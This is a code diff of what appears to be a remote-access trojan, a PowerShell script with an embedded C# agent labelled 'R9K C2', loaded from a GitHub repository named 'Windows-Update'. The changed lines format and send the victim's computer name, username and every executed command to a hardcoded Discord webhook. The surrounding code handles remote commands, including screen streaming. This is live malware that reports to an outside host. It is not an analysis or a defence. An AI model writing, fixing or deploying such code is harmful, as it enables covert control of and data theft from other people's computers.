@@ -16,7 +16,8 @@ $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/
 # Função para Log no Discord
 function Send-Webhook($msg) {
     try {
-        $body = @{ content = "**[R9K C2]** `" + $env:COMPUTERNAME + "`" (``$env:USERNAME``)\n" + $msg } | ConvertTo-Json
+        $text = "**[R9K C2]** " + $env:COMPUTERNAME + " (" + $env:USERNAME + ")`n" + $msg
+        $body = @{ content = $text } | ConvertTo-Json -Compress
         Invoke-RestMethod -Uri $webhookURL -Method Post -Body $body -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
     } catch {}
 }
@@ -626,7 +627,7 @@ if (-not ("R9KAgent" -as [type])) {
         static void ProcessCommand(string cmd, StreamWriter myWriter) {
             try {
                 // Log comando no Discord
-                try { System.Net.WebClient wc = new System.Net.WebClient(); wc.Headers.Add("Content-Type", "application/json"); string body = "{\"content\":\"**[R9K CMD]** `" + Environment.MachineName + "` executou: `" + cmd + "`\"}"; wc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", body); } catch {}
+                try { System.Net.WebClient wc = new System.Net.WebClient(); wc.Headers.Add("Content-Type", "application/json"); string body = "{\"content\":\"**[R9K CMD]** " + Environment.MachineName + " executou: " + cmd + "\"}"; wc.UploadString("https://canary.discord.com/api/webhooks/1569104108970057808/AcOuccicbirVBoi7gMTYjsZPiy9CpKJOI1Lwk28-4LMgMtaOnYuoucklvCcgbHF36egZ", "POST", body); } catch {}
 
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
